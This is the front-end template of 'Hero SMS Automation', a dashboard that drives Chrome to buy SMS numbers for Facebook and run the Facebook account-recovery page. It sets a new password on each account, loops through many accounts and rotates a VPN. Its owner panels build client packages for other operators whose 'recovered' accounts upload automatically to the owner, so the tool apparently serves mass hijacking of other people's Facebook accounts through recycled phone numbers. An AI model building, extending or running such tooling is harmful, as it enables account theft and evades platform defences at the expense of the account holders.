            background: linear-gradient(135deg, var(--primary-glow), #4f46e5);
            color: white;
            box-shadow: 0 4px 15px rgba(99, 102, 241, 0.35);
        }

        .btn-primary:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(99, 102, 241, 0.45);
        }

        .btn-primary:active:not(:disabled) {
            transform: translateY(0);
        }

        .btn-danger {
            background: linear-gradient(135deg, var(--danger-color), #dc2626);
            color: white;
            box-shadow: 0 4px 15px rgba(239, 68, 68, 0.3);
        }

        .btn-danger:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(239, 68, 68, 0.45);
        }

        .btn-secondary {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid var(--border-color);
            color: var(--text-main);
        }

        .btn-secondary:hover:not(:disabled) {
            background: rgba(255, 255, 255, 0.08);
            border-color: rgba(255, 255, 255, 0.15);
        }

        .btn:disabled {
            opacity: 0.4;
            cursor: not-allowed;
            box-shadow: none;
        }

        .actions-grid {
            display: grid;
            grid-template-columns: 1fr;
            gap: 0.75rem;
        }

        /* Log console styling */
        .console-panel {
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            background: rgba(5, 7, 13, 0.95);
            border-radius: 16px;
            border: 1px solid var(--border-color);
            overflow: hidden;
            box-shadow: inset 0 4px 20px rgba(0,0,0,0.8);
            height: 520px;
        }

        .console-header {
            background: rgba(17, 24, 39, 0.5);
            border-bottom: 1px solid var(--border-color);
            padding: 0.75rem 1.25rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .console-tab {
            font-size: 0.85rem;
            font-weight: 500;
            color: var(--text-muted);
            letter-spacing: 0.05em;
            text-transform: uppercase;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .console-tab::before {
            content: "";
            width: 6px;
            height: 6px;
            border-radius: 50%;
            background-color: var(--primary-glow);
        }

        .console-actions {
            display: flex;
            gap: 0.75rem;
            align-items: center;
        }

        .autoscroll-toggle {
            display: flex;
            align-items: center;
            gap: 0.4rem;
            font-size: 0.75rem;
            color: var(--text-muted);
            cursor: pointer;
        }

        .autoscroll-toggle input {
            display: none;
        }

        .autoscroll-toggle .indicator {
            width: 12px;
            height: 12px;
            border-radius: 3px;
            border: 1px solid var(--border-color);
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .autoscroll-toggle input:checked + .indicator {
            background-color: var(--primary-glow);
            border-color: var(--primary-glow);
        }

        .autoscroll-toggle input:checked + .indicator::after {
            content: "";
            width: 3px;
            height: 6px;
            border: solid white;
            border-width: 0 1.5px 1.5px 0;
            transform: rotate(45deg);
        }

        .clear-btn {
            background: none;
            border: none;
            color: var(--text-muted);
            font-size: 0.75rem;
            cursor: pointer;
            padding: 0.25rem;
        }

        .clear-btn:hover {
            color: var(--text-main);
        }

        .console-body {
            flex-grow: 1;
            padding: 1.25rem;
            overflow-y: auto;
            font-family: var(--font-mono);
            font-size: 0.85rem;
            line-height: 1.5;
            display: flex;
            flex-direction: column;
            gap: 0.25rem;
            user-select: text;
        }

        .console-line {
            white-space: pre-wrap;
            word-break: break-all;
        }

        /* Color classes for different logs */
        .line-info { color: #f3f4f6; }
        .line-success { color: #10b981; font-weight: 500; }
        .line-warning { color: #f59e0b; }
        .line-error { color: #ef4444; font-weight: 500; }
        .line-system { color: #818cf8; font-weight: 600; border-top: 1px dashed rgba(255,255,255,0.05); border-bottom: 1px dashed rgba(255,255,255,0.05); padding: 0.25rem 0; margin: 0.25rem 0; }
        .line-code { color: #38bdf8; font-weight: 600; }

        /* Bottom table section */
        .bottom-section {
            grid-column: 1 / -1;
            display: flex;
            flex-direction: column;
            gap: 1rem;
        }

        .table-container {
            width: 100%;
            overflow-x: auto;
            max-height: 550px;
            overflow-y: auto;
            border: 1px solid var(--border-color);
            border-radius: 12px;
            background: var(--container-bg);
            backdrop-filter: blur(16px);
        }
        
        .table-container::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }
        .table-container::-webkit-scrollbar-track {
            background: rgba(255, 255, 255, 0.02);
            border-radius: 4px;
        }
        .table-container::-webkit-scrollbar-thumb {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 4px;
        }
        .table-container::-webkit-scrollbar-thumb:hover {
            background: rgba(255, 255, 255, 0.2);
        }

        table {
            width: 100%;
            border-collapse: collapse;
            text-align: left;
            font-size: 0.9rem;
        }

        th, td {
            padding: 1rem 1.25rem;
            border-bottom: 1px solid var(--border-color);
        }

        th {
            position: sticky;
            top: 0;
            z-index: 2;
            background: #111827 !important;
            color: var(--text-muted);
            font-weight: 600;
            text-transform: uppercase;
            font-size: 0.75rem;
            letter-spacing: 0.05em;
        }

        tr:last-child td {
            border-bottom: none;
        }

        tr:hover td {
            background: rgba(255, 255, 255, 0.02);
        }

        .copy-btn {
            background: rgba(99, 102, 241, 0.1);
            border: 1px solid rgba(99, 102, 241, 0.25);
            color: #a5b4fc;
            padding: 0.4rem 0.75rem;
            border-radius: 6px;
            font-size: 0.75rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            display: inline-flex;
            align-items: center;
            gap: 0.25rem;
        }

        .copy-btn:hover {
            background: var(--primary-glow);
            color: white;
            border-color: var(--primary-glow);
            box-shadow: 0 0 10px rgba(99, 102, 241, 0.35);
        }

        .copy-btn:active {
            transform: scale(0.95);
        }

        .toast {
            position: fixed;
            bottom: 2rem;
            right: 2rem;
            background: rgba(16, 185, 129, 0.95);
            color: white;
            border-radius: 8px;
            padding: 1rem 1.5rem;
            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
            transform: translateY(100px);
            opacity: 0;
            transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
            z-index: 1000;
            display: flex;
            align-items: center;
            gap: 0.5rem;
            font-weight: 500;
        }

        .toast.show {
            transform: translateY(0);
            opacity: 1;
        }

        /* Responsive */
        @media (max-width: 960px) {
            .main-container {
                grid-template-columns: 1fr;
            }
        }

        @keyframes dot-pulse {
            0% {
                transform: scale(0.95);
                box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7);
            }
            70% {
                transform: scale(1);
                box-shadow: 0 0 0 5px rgba(16, 185, 129, 0);
            }
            100% {
                transform: scale(0.95);
                box-shadow: 0 0 0 0 rgba(16, 185, 129, 0);
            }
        }

        #stats-grid {
            display: grid;
            grid-template-columns: repeat(5, 1fr);
            gap: 1rem;
            margin-top: 1rem;
            max-height: 380px;
            overflow-y: auto;
            padding-right: 4px;
        }

        #stats-grid::-webkit-scrollbar {
            width: 6px;
        }

        #stats-grid::-webkit-scrollbar-track {
            background: rgba(255, 255, 255, 0.02);
            border-radius: 3px;
        }

        #stats-grid::-webkit-scrollbar-thumb {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 3px;
        }

        #stats-grid::-webkit-scrollbar-thumb:hover {
            background: rgba(255, 255, 255, 0.2);
        }

        /* ===== Auth: header buttons + modals ===== */
        .header-btn {
            display: inline-flex; align-items: center; gap: 0.4rem;
            padding: 0.45rem 0.8rem;
            background: rgba(255,255,255,0.05);
            border: 1px solid var(--border-color);
            border-radius: 10px;
            color: var(--text-main);
            font-family: var(--font-main);
            font-size: 0.85rem;
            cursor: pointer;
            transition: background .15s, border-color .15s;
        }
        .header-btn:hover { background: rgba(99,102,241,0.18); border-color: var(--primary-glow); }
        /* Kill-switch button: green when service is live, red when suspended */
        #serviceBtn.svc-active { border-color: rgba(16,185,129,0.5); color: #6ee7b7; }
        #serviceBtn.svc-active:hover { background: rgba(16,185,129,0.15); }
        #serviceBtn.svc-locked { border-color: rgba(239,68,68,0.6); color: #fca5a5; background: rgba(239,68,68,0.12); }
        #serviceBtn.svc-locked:hover { background: rgba(239,68,68,0.2); }
        .badge-owner { background: rgba(245,158,11,0.18); color: #fcd34d; }
        /* Show/hide password toggle */
        .pw-wrap { position: relative; display: flex; align-items: center; }
        .pw-wrap > input { width: 100%; padding-right: 4rem; }
        .pw-toggle {
            position: absolute; right: 6px; top: 50%; transform: translateY(-50%);
            background: rgba(255,255,255,0.06); border: 1px solid var(--border-color);
            color: var(--text-muted); font-family: var(--font-main); font-size: 0.72rem;
            padding: 0.25rem 0.55rem; border-radius: 6px; cursor: pointer; line-height: 1;
        }
        .pw-toggle:hover { color: var(--text-main); border-color: var(--primary-glow); }
        .modal-overlay {
            display: none;
            position: fixed; inset: 0;
            background: rgba(0,0,0,0.6);
            backdrop-filter: blur(4px);
            z-index: 1000;
            align-items: center; justify-content: center;
        }
        .modal-overlay.open { display: flex; }
        .modal-box {
            width: 100%; max-width: 620px;
            max-height: 85vh; overflow-y: auto;
            background: #111827;
            border: 1px solid var(--border-color);
            border-radius: 16px;
            box-shadow: 0 24px 70px rgba(0,0,0,0.55);
        }
        .modal-header {
            display: flex; align-items: center; justify-content: space-between;
            padding: 1.1rem 1.4rem;
            border-bottom: 1px solid var(--border-color);
        }
        .modal-header h2 { font-size: 1.1rem; font-weight: 600; }
        .modal-close { background: none; border: none; color: var(--text-muted); font-size: 1.6rem; line-height: 1; cursor: pointer; }
        .modal-close:hover { color: var(--text-main); }
        .modal-body { padding: 1.2rem 1.4rem; }
        .modal-input {
            width: 100%; padding: 0.6rem 0.8rem; margin: 0.3rem 0 0.9rem;
            background: rgba(0,0,0,0.25); border: 1px solid var(--border-color);
            border-radius: 8px; color: var(--text-main); font-family: var(--font-main); outline: none;
        }
        .modal-input:focus { border-color: var(--primary-glow); }
        .user-create-row { display: grid; grid-template-columns: 1fr 1fr auto auto; gap: 0.5rem; margin-bottom: 1rem; }
        .user-create-row input, .user-create-row select {
            padding: 0.55rem 0.7rem; background: rgba(0,0,0,0.25);
            border: 1px solid var(--border-color); border-radius: 8px;
            color: var(--text-main); font-family: var(--font-main); outline: none;
        }
        .btn-primary {
            padding: 0.55rem 1rem; background: var(--primary-glow); color: #fff;
            border: none; border-radius: 8px; font-family: var(--font-main);
            font-weight: 600; cursor: pointer; transition: background .15s;
        }
        .btn-primary:hover { background: var(--primary-glow-hover); }
        .users-table { width: 100%; border-collapse: collapse; font-size: 0.88rem; }
        .users-table th, .users-table td { text-align: left; padding: 0.6rem 0.5rem; border-bottom: 1px solid var(--border-color); }
        .users-table th { color: var(--text-muted); font-weight: 500; }
        .badge { padding: 0.15rem 0.55rem; border-radius: 999px; font-size: 0.72rem; font-weight: 600; }
        .badge-admin { background: rgba(99,102,241,0.18); color: #a5b4fc; }
        .badge-user { background: rgba(255,255,255,0.08); color: var(--text-muted); }
        .badge-on { background: rgba(16,185,129,0.15); color: #6ee7b7; }
        .badge-off { background: rgba(239,68,68,0.15); color: #fca5a5; }
        .row-action { background: none; border: 1px solid var(--border-color); color: var(--text-main); padding: 0.3rem 0.6rem; border-radius: 7px; cursor: pointer; font-size: 0.78rem; margin-right: 0.3rem; }
        .row-action:hover { border-color: var(--primary-glow); }
        .row-action.danger:hover { border-color: var(--danger-color); color: #fca5a5; }
        .modal-msg { font-size: 0.82rem; min-height: 1.1rem; margin-bottom: 0.6rem; }
        .modal-msg.ok { color: #6ee7b7; }
        .modal-msg.err { color: #fca5a5; }
    </style>
</head>
<body>
    <header>
        <div class="logo-section">
            <div class="logo-icon">
                <svg viewBox="0 0 24 24">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>
                </svg>
            </div>
            <div class="logo-text">Hero SMS Automation</div>
        </div>
        <div style="display:flex; align-items:center; gap:0.75rem;">
            <div class="status-badge">
                <div class="status-dot" id="status-dot"></div>
                <span id="status-text">Idle</span>
            </div>
            {% if is_owner %}
            <button id="serviceBtn" onclick="toggleService()" class="header-btn" title="Suspend or resume the whole service">
                <span id="serviceBtnLabel">Service</span>
            </button>
            {% endif %}
            {% if is_owner and is_manager %}
            <button onclick="openInstancesModal()" class="header-btn" title="Create and manage separate isolated instances">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M4 6a2 2 0 012-2h12a2 2 0 012 2v2a2 2 0 01-2 2H6a2 2 0 01-2-2V6zM4 16a2 2 0 012-2h12a2 2 0 012 2v2a2 2 0 01-2 2H6a2 2 0 01-2-2v-2z"/></svg>
                Instances
            </button>
            <button onclick="openClientsModal()" class="header-btn" title="Clients running the app on their own PC (monitor, disable, download)">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M3 15a4 4 0 004 4h9a5 5 0 001-9.9A5 5 0 007 8a4 4 0 00-4 4 3 3 0 000 3z"/></svg>
                Clients
            </button>
            <button onclick="openActivityModal()" class="header-btn" title="Activity log across all clients">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M9 17v-6h13M9 5h13M5 5h.01M5 12h.01M5 19h.01"/></svg>
                Activity
            </button>
            {% endif %}
            {% if is_admin %}
            <button onclick="openUsersModal()" class="header-btn" title="Manage users">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M17 20h5v-2a4 4 0 00-3-3.87M9 20H4v-2a4 4 0 013-3.87m6-1.13a4 4 0 10-4-4 4 4 0 004 4zm6 0a3 3 0 10-3-3"/></svg>
                Users
            </button>
            {% endif %}
            <button onclick="openPasswordModal()" class="header-btn" title="Change your password">{{ current_username }}</button>
            <a href="/logout" class="header-btn" title="Sign out" style="text-decoration:none;">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"/></svg>
            </a>
        </div>
    </header>

    <!-- ===== User management modal (admin) ===== -->
    <div id="usersModal" class="modal-overlay" onclick="if(event.target===this)closeUsersModal()">
        <div class="modal-box">
            <div class="modal-header">
                <h2>User Accounts</h2>
                <button class="modal-close" onclick="closeUsersModal()">&times;</button>
            </div>
            <div class="modal-body">
                <div class="user-create-row">
                    <input type="text" id="nu_username" placeholder="Username">
                    <div class="pw-wrap">
                        <input type="password" id="nu_password" placeholder="Password">
                        <button type="button" class="pw-toggle" onclick="togglePw('nu_password', this)" aria-label="Show or hide password">Show</button>
                    </div>
                    <select id="nu_role">
                        <option value="user">User</option>
                        <option value="admin">Admin</option>
                    </select>
                    <button onclick="createUser()" class="btn-primary">Add</button>
                </div>
                <div id="users_msg" class="modal-msg"></div>
                <table class="users-table">
                    <thead><tr><th>Username</th><th>Role</th><th>Status</th><th>Actions</th></tr></thead>
                    <tbody id="users_tbody"></tbody>
                </table>
            </div>
        </div>
    </div>

    <!-- ===== Isolated instances modal (owner) ===== -->
    <div id="instancesModal" class="modal-overlay" onclick="if(event.target===this)closeInstancesModal()">
        <div class="modal-box">
            <div class="modal-header">
                <h2>Isolated Instances</h2>
                <button class="modal-close" onclick="closeInstancesModal()">&times;</button>
            </div>
            <div class="modal-body">
                <p style="font-size:0.82rem;color:var(--text-muted);margin-bottom:0.8rem;">
                    Each instance is a fully separate server on its own port, with its own login accounts,
                    Chrome/Facebook sessions, bot and results. Give one instance to each person.
                </p>
                <div class="user-create-row" style="grid-template-columns: 1fr 130px auto;">
                    <input type="text" id="ni_name" placeholder="Instance name (e.g. client1)">
                    <input type="text" id="ni_port" placeholder="Port (auto)">
                    <button onclick="createInstance()" class="btn-primary">Create &amp; Start</button>
                </div>
                <div id="instances_msg" class="modal-msg"></div>
                <table class="users-table">
                    <thead><tr><th>Name</th><th>Port</th><th>Status</th><th>Actions</th></tr></thead>
                    <tbody id="instances_tbody"></tbody>
                </table>
            </div>
        </div>
    </div>

    <!-- ===== Clients (run on their own PC) modal (owner) ===== -->
    <div id="clientsModal" class="modal-overlay" onclick="if(event.target===this)closeClientsModal()">
        <div class="modal-box">
            <div class="modal-header">
                <h2>Clients (run on their own PC)</h2>
                <button class="modal-close" onclick="closeClientsModal()">&times;</button>
            </div>
            <div class="modal-body">
                <p style="font-size:0.82rem;color:var(--text-muted);margin-bottom:0.9rem;">
                    These clients run the app on their own computer (their Chrome, their IP). Their recovered
                    accounts auto-upload to your <b>Client_Recoveries</b> folder.
                    <b>1)</b> Create the client here to get its key.
                    <b>2)</b> Run <b>make_client.bat</b> with that key to build the package you send them.
                </p>
                <div class="user-create-row" style="grid-template-columns: 1fr auto;">
                    <input type="text" id="nc_name" placeholder="New client name (e.g. RAIHAN)">
                    <button onclick="createClient()" class="btn-primary">Create &amp; get key</button>
                </div>
                <div id="clients_msg" class="modal-msg"></div>
                <div id="clients_key_box" style="display:none;background:rgba(16,185,129,0.08);border:1px solid rgba(16,185,129,0.35);border-radius:8px;padding:0.7rem 0.9rem;margin-bottom:0.9rem;font-size:0.82rem;">
                    <div style="color:#6ee7b7;font-weight:600;margin-bottom:0.4rem;">Client created — copy this key into make_client:</div>
                    <div style="margin-bottom:0.3rem;">Name: <code id="ck_name"></code></div>
                    <div style="display:flex;align-items:center;gap:0.5rem;">
                        <span>Key:</span>
                        <code id="ck_key" style="word-break:break-all;flex:1;"></code>
                        <button class="btn-primary" style="padding:0.3rem 0.7rem;font-size:0.75rem;" onclick="copyText(document.getElementById('ck_key').textContent, this)">Copy</button>
                    </div>
                </div>
                <table class="users-table">
                    <thead><tr><th>Client</th><th>Status</th><th>Last seen</th><th>Recovered</th><th>Actions</th></tr></thead>
                    <tbody id="clients_tbody"></tbody>
                </table>
            </div>
        </div>
    </div>

    <!-- ===== Global activity dashboard modal (owner) ===== -->
    <div id="activityModal" class="modal-overlay" onclick="if(event.target===this)closeActivityModal()">
        <div class="modal-box" style="max-width:720px;">
            <div class="modal-header">
                <h2>Activity — all clients</h2>
                <button class="modal-close" onclick="closeActivityModal()">&times;</button>
            </div>
            <div class="modal-body">
                <div style="display:flex;gap:0.75rem;margin-bottom:1rem;flex-wrap:wrap;">
                    <div style="flex:1;min-width:120px;background:rgba(255,255,255,0.03);border:1px solid var(--border-color);border-radius:10px;padding:0.7rem 0.9rem;">
                        <div style="font-size:1.4rem;font-weight:700;" id="act_clients">0</div>
                        <div style="font-size:0.72rem;color:var(--text-muted);">CLIENTS</div>
                    </div>
                    <div style="flex:1;min-width:120px;background:rgba(16,185,129,0.06);border:1px solid rgba(16,185,129,0.25);border-radius:10px;padding:0.7rem 0.9rem;">
                        <div style="font-size:1.4rem;font-weight:700;color:#6ee7b7;" id="act_active">0</div>
                        <div style="font-size:0.72rem;color:var(--text-muted);">ACTIVE</div>
                    </div>
                    <div style="flex:1;min-width:120px;background:rgba(99,102,241,0.08);border:1px solid rgba(99,102,241,0.3);border-radius:10px;padding:0.7rem 0.9rem;">
                        <div style="font-size:1.4rem;font-weight:700;color:#a5b4fc;" id="act_recovered">0</div>
                        <div style="font-size:0.72rem;color:var(--text-muted);">TOTAL RECOVERED</div>
                    </div>
                </div>
                <div id="activity_msg" class="modal-msg"></div>
                <table class="users-table">
                    <thead><tr><th style="width:150px;">Time</th><th style="width:120px;">Client</th><th>Event</th></tr></thead>
                    <tbody id="activity_tbody"></tbody>
                </table>
            </div>
        </div>
    </div>

    <!-- ===== Client activity log modal (owner) ===== -->
    <div id="clientLogModal" class="modal-overlay" onclick="if(event.target===this)closeClientLog()">
        <div class="modal-box">
            <div class="modal-header">
                <h2 id="client_log_title">Client activity</h2>
                <button class="modal-close" onclick="closeClientLog()">&times;</button>
            </div>
            <div class="modal-body">
                <pre id="client_log_body" style="max-height:55vh;overflow:auto;background:rgba(0,0,0,0.3);border:1px solid var(--border-color);border-radius:8px;padding:0.8rem;font-family:var(--font-mono);font-size:0.8rem;white-space:pre-wrap;color:var(--text-main);margin:0;">Loading…</pre>
            </div>
        </div>
    </div>

    <!-- ===== Change password modal ===== -->
    <div id="passwordModal" class="modal-overlay" onclick="if(event.target===this)closePasswordModal()">
        <div class="modal-box" style="max-width:380px;">
            <div class="modal-header">
                <h2>Change Password</h2>
                <button class="modal-close" onclick="closePasswordModal()">&times;</button>
            </div>
            <div class="modal-body">
                <label style="font-size:0.8rem;color:var(--text-muted);">Current password</label>
                <input type="password" id="pw_current" class="modal-input" placeholder="Current password">
                <label style="font-size:0.8rem;color:var(--text-muted);">New password</label>
                <input type="password" id="pw_new" class="modal-input" placeholder="New password">
                <div id="pw_msg" class="modal-msg"></div>
                <button onclick="changePassword()" class="btn-primary" style="width:100%;margin-top:0.5rem;">Update Password</button>
            </div>
        </div>
    </div>

    <div class="main-container">
        <!-- Configuration panel -->
        <div class="glass-panel">
            <div class="panel-title">
                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                    <path stroke-linecap="round" stroke-linejoin="round" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z" />
                    <path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                </svg>
                Configurations
            </div>
            
            <div style="display: grid; grid-template-columns: 1fr auto auto; gap: 0.5rem; align-items: flex-end;">
                <div class="input-group" style="flex-grow: 1;">
                    <label>Chrome Debug Port URL</label>
                    <input type="text" id="chrome_debug_url" placeholder="http://127.0.0.1:9222">
                </div>
                </div>
                <div style="display: grid; grid-template-columns: 1fr auto auto; gap: 0.5rem; align-items: flex-end;">
                <button class="btn btn-secondary" id="launch-chrome-btn" onclick="launchChrome()" style="width: auto; height: 42px; padding: 0 1rem; font-size: 0.85rem; margin-bottom: 2px;">
                    Launch Profile
                </button>
                <button class="btn btn-danger" id="kill-chrome-btn" onclick="killChrome()" style="width: auto; height: 42px; padding: 0 1rem; font-size: 0.85rem; margin-bottom: 2px; background: rgba(239, 68, 68, 0.15); border-color: rgba(239, 68, 68, 0.35); color: #f87171;">
                    Reset Chrome
                </button>
            </div>

            <div class="input-group">
                <label>Chrome Profile Name</label>
                <input type="text" id="chrome_profile_name" placeholder="Profile 1">
            </div>

            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem;">
                <div class="input-group">
                    <label>Target Service</label>
                    <input type="text" id="service_text" placeholder="Facebook">
                </div>
                <div class="input-group">
                    <label>Target Country</label>
                    <input type="text" id="country_text" placeholder="Brazil">
                </div>
            </div>

            <div class="input-group">
                <label>Buy Button Text / Price Selector</label>
                <input type="text" id="buy_text" placeholder="Buy for $0.099">
            </div>

            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem;">
                <div class="input-group">
                    <label>Min Price Acceptable (USD)</label>
                    <input type="number" step="0.001" id="min_price" placeholder="0.01">
                </div>
                <div class="input-group">
                    <label>Max Price Acceptable (USD)</label>
                    <input type="number" step="0.001" id="max_price" placeholder="0.15">
                </div>
            </div>

            <div class="input-group">
                <label>New Account Password</label>
                <div class="pw-wrap">
                    <input type="password" id="new_password" placeholder="HeroSmsRecover123!">
                    <button type="button" class="pw-toggle" onclick="togglePw('new_password', this)" title="Show/hide password" aria-label="Show or hide password">Show</button>
                </div>
            </div>

            <div class="input-group">
                <label>Target Recovery Page URL</label>
                <input type="text" id="target_url" placeholder="Facebook Identify URL">
            </div>

            <div class="input-group">
                <label>Windows VPN Connection Name (e.g. Surfshark - leave empty to disable)</label>
                <input type="text" id="vpn_connection_name" placeholder="Surfshark">
            </div>

            <!-- ===== API MODE (use a provider's API instead of the website) ===== -->
            <div style="border: 1px dashed rgba(99,102,241,0.5); padding: 1rem; border-radius: 8px; margin: 0.25rem 0; background: rgba(99,102,241,0.04);">
                <label class="checkbox-container" style="padding: 0; margin-bottom: 0.5rem;">
                    <input type="checkbox" id="use_api" onchange="toggleApiFields()">
                    <span class="custom-checkbox"></span>
                    Use API mode (buy number + OTP via provider API — no website scraping)
                </label>
                <div style="font-size:0.72rem;color:var(--text-muted);margin-bottom:0.6rem;">
                    Works with sms-activate / sms-man / tiger-sms and other compatible providers (getNumber/getStatus).
                </div>
                <div id="api-fields" style="display:none; flex-direction:column; gap:0.75rem;">
                    <div class="input-group">
                        <label style="font-size:0.75rem;">Provider</label>
                        <select id="api_provider" onchange="onApiProviderChange()" style="padding:0.6rem 0.7rem; background:rgba(0,0,0,0.25); border:1px solid var(--border-color); border-radius:8px; color:var(--text-main); font-family:var(--font-main); outline:none;">
                            <option value="sms-activate">sms-activate protocol (sms-activate, sms-man, tiger-sms…)</option>
                            <option value="claudeotp">ClaudeOTP (REST API)</option>
                        </select>
                    </div>
                    <div class="input-group">
                        <label style="font-size:0.75rem;">API Base URL</label>
                        <input type="text" id="api_base_url" placeholder="https://api.sms-activate.org/stubs/handler_api.php">
                    </div>
                    <div class="input-group">
                        <label style="font-size:0.75rem;">API Key</label>
                        <div class="pw-wrap">
                            <input type="password" id="api_key" placeholder="your API key">
                            <button type="button" class="pw-toggle" onclick="togglePw('api_key', this)">Show</button>
                        </div>
                    </div>
                    <div style="display:grid; grid-template-columns:1fr 1fr; gap:0.5rem;">
                        <div class="input-group">
                            <label style="font-size:0.75rem;">Service code (e.g. fb)</label>
                            <input type="text" id="api_service_code" placeholder="fb">
                        </div>
                        <div class="input-group">
                            <label style="font-size:0.75rem;">Country code (e.g. 0)</label>
                            <input type="text" id="api_country_code" placeholder="0">
                        </div>
                    </div>
                </div>
            </div>

            <div style="border: 1px dashed var(--border-color); padding: 1rem; border-radius: 8px; margin: 0.25rem 0; background: rgba(255,255,255,0.01);">
                <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 0.75rem;">
                    <label class="checkbox-container" style="padding: 0;">
                        <input type="checkbox" id="auto_login" onchange="toggleAutoLoginFields()">
                        <span class="custom-checkbox"></span>
                        Enable Hero SMS Auto-Login
                    </label>
                </div>
                <div id="auto-login-fields" style="display: none; flex-direction: column; gap: 0.75rem;">
                    <div class="input-group">
                        <label style="font-size: 0.75rem;">Hero SMS Username / Email</label>
                        <input type="text" id="hero_username" placeholder="your-email@example.com">
                    </div>
                    <div class="input-group">
                        <label style="font-size: 0.75rem;">Hero SMS Password</label>
                        <div class="pw-wrap">
                            <input type="password" id="hero_password" placeholder="••••••••">
                            <button type="button" class="pw-toggle" onclick="togglePw('hero_password', this)" title="Show/hide password" aria-label="Show or hide password">Show</button>
                        </div>
                    </div>
                </div>
            </div>

            <div style="display: flex; flex-direction: column; gap: 0.75rem;">
                <label class="checkbox-container">
                    <input type="checkbox" id="multiple_accounts">
                    <span class="custom-checkbox"></span>
                    Loop indefinitely (Multiple Accounts)
                </label>
                
                <label class="checkbox-container">
                    <input type="checkbox" id="confirm_before_buy">
                    <span class="custom-checkbox"></span>
                    Confirm manually before buying
                </label>
            </div>

            <div class="actions-grid">
                <button class="btn btn-secondary" id="save-config-btn" onclick="saveConfig()">Save Settings</button>
                <button class="btn btn-primary" id="start-btn" onclick="startAutomation()">
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
                        <path d="M11.596 8.697l-6.363 3.692c-.54.313-1.233-.066-1.233-.697V4.308c0-.63.692-1.01 1.233-.696l6.363 3.692a.802.802 0 0 1 0 1.393z"/>
                    </svg>
                    Start Automation
                </button>
                <button class="btn btn-danger" id="stop-btn" onclick="stopAutomation()" disabled>
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
                        <path d="M5 3.5h6A1.5 1.5 0 0 1 12.5 5v6a1.5 1.5 0 0 1-1.5 1.5H5A1.5 1.5 0 0 1 3.5 11V5A1.5 1.5 0 0 1 5 3.5z"/>
                    </svg>
                    Stop Automation
                </button>
            </div>
        </div>

        <!-- Right Column -->
        <div style="display: flex; flex-direction: column; gap: 2rem; overflow: hidden;">
            <!-- Terminal log panel -->
            <div class="glass-panel" style="padding: 0; flex-grow: 1;">
                <div class="console-panel" style="height: 480px;">
                    <div class="console-header">
                        <div class="console-tab">Live Output Console</div>
                        <div class="console-actions">
                            <label class="autoscroll-toggle">
                                <input type="checkbox" id="autoscroll-check" checked>
                                <span class="indicator"></span>
                                Auto-scroll
                            </label>
                            <button class="clear-btn" onclick="clearConsole()">Clear console</button>
                        </div>
                    </div>
                    <div class="console-body" id="console-body">
                        <div class="console-line line-system">[SYSTEM] Console initialized. Adjust settings and click 'Start Automation' to begin.</div>
                    </div>
                </div>
            </div>

            <!-- Daily Analytics panel -->
            <div class="glass-panel">
                <div class="panel-title" style="border: none; padding-bottom: 0;">
                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" style="width: 20px; height: 20px; vertical-align: middle; margin-right: 0.5rem; stroke: var(--primary-color);">
